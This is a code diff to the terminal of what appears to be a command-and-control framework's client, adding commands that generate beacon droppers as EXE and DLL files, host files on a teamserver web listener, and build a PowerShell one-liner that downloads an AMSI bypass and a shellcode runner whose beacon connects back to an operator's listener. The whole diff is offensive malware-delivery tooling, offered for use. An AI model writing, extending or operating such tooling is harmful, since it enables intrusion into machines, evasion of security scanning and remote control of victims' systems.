@@ -14,6 +14,8 @@ from grpcClient import *
 import sys
 sys.path.insert(1, './PowershellWebDelivery/')
 import GeneratePowershellLauncher
+sys.path.insert(1, './PeDropper/')
+import GenerateDropperBinary
 
 
 class Terminal(QWidget):
@@ -76,19 +78,25 @@ class Terminal(QWidget):
 
             self.commandEditor.setCmdHistory()
             instructions = commandLine.split()
-            # if len(instructions) < 1:
-            #     return;
+            if len(instructions) < 1:
+                return;
 
             if instructions[0]=="help":
                 self.runHelp()
 
-            elif instructions[0]=="PowershellWebDelivery":
-                self.runPowershellWebDelivery(commandLine, instructions)
+            elif instructions[0]=="Generate" or instructions[0]=="gen":
+                self.runGenerate(commandLine, instructions)
+
+            elif instructions[0]=="GenerateAndHost" or instructions[0]=="gah":
+                self.runGenerateAndHost(commandLine, instructions)
+            
+            elif instructions[0]=="Host":
+                self.runHost(commandLine, instructions)
             
             else:
-                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
                 self.editorOutput.appendHtml(line)
-                line = '\n' + "Command Unknown"  + '\n';
+                line = '\n' + "Error: Command Unknown"  + '\n';
                 self.editorOutput.insertPlainText(line)
 
         self.setCursorEditorAtEnd()
@@ -102,29 +110,238 @@ class Terminal(QWidget):
         self.editorOutput.insertPlainText(line)
 
 
-    def runPowershellWebDelivery(self, commandLine, instructions):
-        if len(instructions) != 2 and len(instructions) != 3:
+    # Host
+    #   Host file hostListenerHash
+    def runHost(self, commandLine, instructions):
+        if len(instructions) < 3:
             line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
             self.editorOutput.appendHtml(line)
-            PowershellWebDeliveryHelpMsg = """PowershellWebDelivery:
-Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
+            helpMsg = """Host:
+Host upload a file on the teamserver to be downloaded by a web request from a web listener (http/https):
 exemple:
-- PowershellWebDelivery ListenerHash
-- PowershellWebDelivery downloadListenerHash connectListenerHash"""
+- Host file hostListenerHash"""
 
-            line = '\n' + PowershellWebDeliveryHelpMsg  + '\n';
+            line = '\n' + helpMsg  + '\n';
             self.editorOutput.insertPlainText(line)
             return;
 
-        # should take 2 listeners: 
-        #   the http/https listener to download the payload from
-        #   one listner for the beacon to connect to
-        listenerDownload = instructions[1]
-        if  len(instructions) == 3:
-            listenerBeacon = instructions[2]
-        else:
-            listenerBeacon = listenerDownload
+        filePath = instructions[1]
+        hostListenerHash = instructions[2]
 
+        commandTeamServer = "infoListener "+hostListenerHash
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return        
+
+        results = result.split("\n")
+        if len(results)<4:
+            return
+
+        schemeDownload = results[0]
+        ipDownload = results[1]
+        portDownload = results[2]
+        downloadPath = results[3]
+        if not downloadPath:
+            error = "Error: Download listener must be of type http or https."
+            self.editorOutput.insertPlainText(error)
+            return
+
+        if downloadPath[0]=="/":
+            downloadPath = downloadPath[1:]
+
+        # Upload the file and get the path
+        try:
+            filename = os.path.basename(filePath)
+            with open(filePath, mode='rb') as fileDesc:
+                payload = fileDesc.read()
+        except IOError:
+            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + "Error: File does not appear to exist." + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+
+        commandTeamServer = "putIntoUploadDir "+hostListenerHash+" "+filename
+        termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer, data=payload)
+        resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+        result = resultTermCommand.result
+        if "Error" in result:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return  
+                
+        result =  schemeDownload + "://" + ipDownload + ":" + portDownload + "/" + downloadPath + filename
+        line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+        self.editorOutput.appendHtml(line)
+        line = '\n' + result  + '\n';
+        self.editorOutput.insertPlainText(line)
+
+
+    # Generate gen
+    #   Generate WindowsExecutable listener exe/dll/service 
+    #   Generate MsOfficeMcaro listener
+    #   Generate HTMLApplication listener
+    #   Generate ...
+    def runGenerate(self, commandLine, instructions):
+        if len(instructions) < 2:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            helpMsg = """Generate:
+Generate generate a payload to deploy a beacon and store it on the client:
+exemple:
+- Generate WindowsExecutable listenerHash exe/dll/service"""
+# - Generate MsOfficeMcaro listenerHash
+# - Generate HTMLApplication listenerHash
+
+            line = '\n' + helpMsg  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return; 
+
+        mode = instructions[1]
+        
+        if mode == "WindowsExecutable":
+            if len(instructions) < 3:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                helpMsg = """Generate WindowsExecutable:
+Generate WindowsExecutable, generate 2 modules dropper, one EXE and one DLL from the appropriate beacon link to the given listener:
+exemple:
+- Generate WindowsExecutable listenerHash"""
+
+                line = '\n' + helpMsg  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return; 
+
+            listener = instructions[2]
+
+            commandTeamServer = "infoListener "+listener
+            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
+
+            result = resultTermCommand.result
+            if "Error" in result:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                line = '\n' + result  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return   
+
+            results = result.split("\n")
+            if len(results)<4:
+                return
+
+            scheme = results[0]
+            ip = results[1]
+            port = results[2]
+
+            commandTeamServer = "getBeaconBinary "+listener
+            termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
+            resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
+
+            result = resultTermCommand.result
+            if "Error" in result:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                line = '\n' + result  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return   
+
+            print("Beacon size", len(resultTermCommand.data))
+            beaconFilePath = "./BeaconHttp.exe"
+            beaconFile = open(beaconFilePath, "wb")
+            beaconFile.write(resultTermCommand.data)
+
+            beaconArg = ip+" "+port
+            if scheme=="http" or scheme=="https":
+                beaconArg = beaconArg+" "+scheme
+
+            # launch PeDropper
+            dropperExePath, dropperDllPath = GenerateDropperBinary.generatePayloads(beaconFilePath, beaconArg, "")
+
+            result =  "Dropper EXE path: " + dropperExePath + "\n"
+            result += "Dropper DLL path: " + dropperDllPath 
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            line = '\n' + result  + '\n';
+            self.editorOutput.insertPlainText(line)
+            
+        # elif mode == "MsOfficeMcaro":
+        # elif mode == "HTMLApplication":
+        else:
+            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            helpMsg = """Error: Mode not recognised"""
+
+            line = '\n' + helpMsg  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return;
+
+
+    # GenerateAndHost gah
+    #   GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash
+    #   GenerateAndHost cmd listenerHash hostListenerHash
+    def runGenerateAndHost(self, commandLine, instructions):
+        if len(instructions) < 2:
+            line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            helpMsg = """GenerateAndHost:
+GenerateAndHost generate a playload that is store on the teamserver to be downloaded by a web request from a web listener (http/https):
+exemple:
+- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""
+
+            line = '\n' + helpMsg  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return;
+
+        mode = instructions[1]
+
+        if mode == "PowershellWebDelivery":
+            if len(instructions) < 3:
+                line = '<p style=\"color:orange;white-space:pre\">[+] ' + commandLine + '</p>'
+                self.editorOutput.appendHtml(line)
+                PowershellWebDeliveryHelpMsg = """GenerateAndHost PowershellWebDelivery:
+Generate a powershell oneliner to download a AMSI bypass and a shellcode runner from a listener. The shellcode runner launch a beacon configured to connect back to the specified listener.
+exemple:
+- GenerateAndHost PowershellWebDelivery listenerHash
+- GenerateAndHost PowershellWebDelivery listenerHash hostListenerHash"""
+
+                line = '\n' + PowershellWebDeliveryHelpMsg  + '\n';
+                self.editorOutput.insertPlainText(line)
+                return;
+            
+            # should take 2 listeners: 
+            #   the http/https listener to download the payload from
+            #   one listner for the beacon to connect to
+            listenerBeacon = instructions[2]
+            if  len(instructions) >= 4:
+                listenerDownload = instructions[3]
+            else:
+                listenerDownload = listenerBeacon
+
+            self.GenerateAndHostPowershellWebDelivery(commandLine, listenerDownload, listenerBeacon)
+    
+        else:
+            line = '<p style=\"color:red;white-space:pre\">[+] ' + commandLine + '</p>'
+            self.editorOutput.appendHtml(line)
+            helpMsg = """Error: Mode not recognised"""
+
+            line = '\n' + helpMsg  + '\n';
+            self.editorOutput.insertPlainText(line)
+            return;
+
+
+    # Implementation de GenerateAndHost PowershellWebDelivery
+    def GenerateAndHostPowershellWebDelivery(self, commandLine,  listenerDownload, listenerBeacon):
         commandTeamServer = "infoListener "+listenerDownload
         termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
         resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
@@ -153,7 +370,7 @@ exemple:
         if downloadPath[0]=="/":
             downloadPath = downloadPath[1:]
 
-        if  len(instructions) == 3:
+        if  listenerBeacon != listenerDownload:
             commandTeamServer = "infoListener "+listenerBeacon
             termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
             resultTermCommand = self.grpcClient.sendTermCmd(termCommand)    
@@ -311,15 +528,21 @@ class CommandEditor(QLineEdit):
 
 
 def getHelpMsg():
-    helpText    = "help\n"
-    helpText += "PowershellWebDelivery\n"
+    helpText  = "help\n"
+    helpText += "Host\n"
+    helpText += "Generate\n"
+    helpText += "GenerateAndHost\n"
     return helpText
 
 
 completerData = [
     ('help',[]),
-    ('PowershellWebDelivery',[
-            ('listener',[]),
+    ('Host',[]),
+    ('Generate',[
+            ('WindowsExecutable',[]),
+             ]),
+    ('GenerateAndHost',[
+            ('PowershellWebDelivery',[]),
              ]),
 ]
 
